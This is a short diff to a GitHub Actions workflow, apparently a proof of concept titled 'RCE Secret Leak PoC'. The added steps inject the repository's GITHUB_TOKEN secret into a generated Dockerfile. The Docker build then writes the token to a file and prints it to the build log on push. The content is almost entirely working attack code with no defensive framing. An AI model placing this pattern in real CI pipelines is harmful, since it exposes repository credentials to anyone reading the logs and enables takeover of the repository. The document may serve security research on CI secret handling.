@@ -1,4 +1,4 @@
-name: RCE with Secret Leak
+name: RCE Secret Leak PoC
 
 on:
   push:
@@ -7,10 +7,12 @@ jobs:
   rce:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repository
+      - name: Checkout
         uses: actions/checkout@v2
 
-      - name: Run malicious Docker build
+      - name: Inject GITHUB_TOKEN into Dockerfile
         run: |
-          echo -e 'FROM alpine\nRUN echo $GITHUB_TOKEN > /leaked' > Dockerfile
-          docker build -t test-image .
+          echo -e "FROM alpine\nRUN echo '${{ secrets.GITHUB_TOKEN }}' > /leaked && cat /leaked" > Dockerfile
+
+      - name: Build Dockerfile (Triggers Secret Leak)
+        run: docker build -t test-image .
